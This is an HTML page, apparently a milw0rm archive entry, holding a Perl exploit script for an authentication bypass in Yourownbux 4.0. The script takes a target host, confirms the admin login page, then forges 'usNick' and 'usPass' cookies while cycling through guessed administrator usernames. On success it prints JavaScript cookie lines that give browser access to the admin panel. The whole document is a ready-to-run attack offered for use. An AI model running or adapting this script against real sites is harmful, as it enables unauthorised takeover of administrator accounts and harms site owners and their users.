<html><head><title>Yourownbux 4.0 (COOKIE) Authentication Bypass Exploit</title></head><pre>#!/usr/bin/perl

use LWP::UserAgent;
use HTTP::Request;

#+-------------------------------------------------------------------------------------------------+-#
#+ Yourownbux v4.0                   ------------------------------------------------------------+--+
#+ Cookie Modification Exploit -----------------------------------------------------------------++
#+ Discovered By: Tec-n0x | 04/9/2008 --------------------------------------------------------++
#
#+ Dropsec.com
#
#+ Modify The Line 39, Adding More User's that can be the admin username------------+
#+
# + Gr33tz: Celciuz, OzX, N.O.X, MurdeR, Syst3m-c0d3r &amp;&amp; All Friends --++
#+-------------------------------------------------------------+----------------------------------------#



system(&quot;clear&quot;);

print &quot;
# Yourownbux v4.0 Cookie Modification Exploit\n# Discovered By: Tec-n0x\n\n# Tec-n0x [ at ] hotmail [ dot ] com &gt; DropSec.com 
\n\n&quot;;
print &quot;Target [ Example: www.sitedemo.com ] :\n&gt; &quot;;
$target = &lt;STDIN&gt;;
chop($target);

if($target =~ m/www\.(.*)\.(.*)/) {

$other = $1;
check1($target);

} else {
print &quot;\nInvalid Target.&quot;;
exit();
}

sub explote {

@tryusers = (&quot;admina&quot;, &quot;administrator&quot;, &quot;admins&quot;, &quot;admin&quot;, &quot;master&quot;, &quot;manager&quot;, &quot;root&quot;, &quot;$other&quot;); 
# Add Posible Users.

$check = shift;

foreach $user (@tryusers) { 

$pass = &quot;Tec-n0x&quot;;

print &quot;\n\tTrying &gt; $user\n&quot;;

	$browser = LWP::UserAgent-&gt;new();
	$browser-&gt;agent(&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14&quot;);
	$browser-&gt;default_header(&quot;Cookie&quot; =&gt; &quot;usNick=$user; usPass=$pass&quot;);
	$get = HTTP::Request-&gt;new(GET =&gt; $check);
	$resp = $browser-&gt;request($get);
	$content = $resp-&gt;content();

@code = split(&quot;\n&quot;,$content);

	foreach $checka (@code) {

			if($checka =~ m/Emails|Served|Workload|Overview/) {

system(&quot;clear&quot;);

print &quot;Succesfull EXPLOTED ...!!\n\nValid Username: $user\n\nGo to: $check\n\n And Put this on your browser:&quot;;

$vd = &quot;javascript\:document\.cookie = \&quot;usNick=$user\; path=\/\&quot;\;&quot;;
$vda = &quot;javascript\:document\.cookie = \&quot;usPass=Dropsec\.com\; path=\/\&quot;\;&quot;;

print &quot;

+------------------------------------+
+ $vd\n+ $vda
+------------------------------------+
&quot;;


$yes = 1;

exit();

}
}
}

if($yes != 1) {

print &quot;\n\n\nExploit Failed&quot;;

exit();

}

}
sub check1 {

$target = shift;

$check = &quot;http\:\/\/$target\/admin\/index\.php&quot;;

	$browser = LWP::UserAgent-&gt;new();
	$browser-&gt;agent(&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14&quot;);
	$get = HTTP::Request-&gt;new(GET =&gt; $check);
	$resp = $browser-&gt;request($get);
	$content = $resp-&gt;content();

@code = split(&quot;\n&quot;,$content);

	foreach $checka (@code) {

			if($checka =~ m/You must login as administrator to access this page/) {

print &quot;Check 1 [ OK ]\n&quot;;

$success = 1;

explote($check);

} 

}

if($sucess != 1) {

print &quot;Failed&quot;;

exit();

}

}

# milw0rm.com [2008-09-11]</pre></html>